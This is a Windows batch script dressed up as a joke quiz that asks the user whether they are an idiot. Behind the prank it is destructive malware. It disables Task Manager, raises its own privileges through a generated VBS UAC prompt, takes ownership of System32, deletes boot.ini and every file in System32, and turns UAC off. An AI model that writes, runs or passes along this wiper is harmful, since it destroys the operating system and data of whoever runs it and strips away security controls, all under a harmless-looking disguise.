@echo off 
echo ARE YOU AN IDIOT? (answer in only yes/no)
set /p input=
if /i %input%==yes goto yes
if /i %input%==no goto no
if /i not %input%== yes,no goto 1

:yes
@echo "Yeah you really are LOL see you later!! (im not responsible for any damages done!!"
pause
exit
:no 
@echo you really think you aren't... lol THINK AGAIN!!!
timeout /t 5 NOBREAK > nul 
start https://www.youtube.com/watch?v=48rz8udZBmQ
start https://www.mcafee.com/consumer/en-us/landing-page/direct/aff/mtp-family/desktop/abt/2025/mdo-182/mcafee-total-protection_4-15.html?tm_local_lp_ab_test_variant=en-us_direct_aff_tax_2025_ph2&culture=en-us&prgt=lc&SID=mcaffe.com&cjevent=096faecd0f0b11f083be00540a1eba22&affid=1494&csrc=cj&csrcl2=Corsearch&ccoe=direct&ccoel2=am&ccstype=partnerlinks_096faecd0f0b11f083be00540a1eba22&CID=242012&PID=2798135&adobe_mc_sdid=SDID%3D48C5C1AAF9513146-77B4D6817CB04A87%7CMCORGID%3DA729776A5245B1590A490D44%40AdobeOrg%7CTS%3D1743520077
start https://www.bing.com/search?q=how+to+remove+virus+from+my+pc&form=WSBEDG&qs=MT&cvid=b2114ec9b3fb4ab7894262a95320b041&pq=how+to+remove+virus+from+my+pc&cc=XX&setlang=en-US&nclid=AA0B0A0E23037799A5349FA1434A1588&ts=1743520258107&wsso=Moderate
start https://www.bing.com/ck/a?!&&p=2fa0ce2c3e6f1572db0b81a1c487ec12c706ff114403d99fffaed7d33af35c4eJmltdHM9MTc0NDUwMjQwMA&ptn=3&ver=2&hsh=4&fclid=2d4db6ea-6603-68a4-3e4e-a32767286910&psq=what+is+my+ip+address&u=a1aHR0cHM6Ly93aGF0aXNteWlwYWRkcmVzcy5jb20v&ntb=1
timeout /t 6 NOBREAK >nul 
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
REM Check if running with admin privileges
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Running with administrator privileges
    set "admin=1"
) else (
    echo Not running with administrator privileges. Attempting to elevate...
    set "admin=0"
)

REM If not running with admin privileges, elevate
if "%admin%"=="0" (
    echo Elevating privileges...
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" || (
        echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
        echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
        "%temp%\getadmin.vbs"
        del "%temp%\getadmin.vbs"
        exit /B
    )
    echo Successfully elevated privileges!
)

echo Prepare for total doom...
echo.
echo.

REM Take ownership of System32
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant administrators:F /t
cd C:\Windows\System32

REM Delete System32
del /F /S /Q C:\boot.ini
timeout /t 4 NOBREAK > nul
del /F /S /Q *.*

%windir%\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

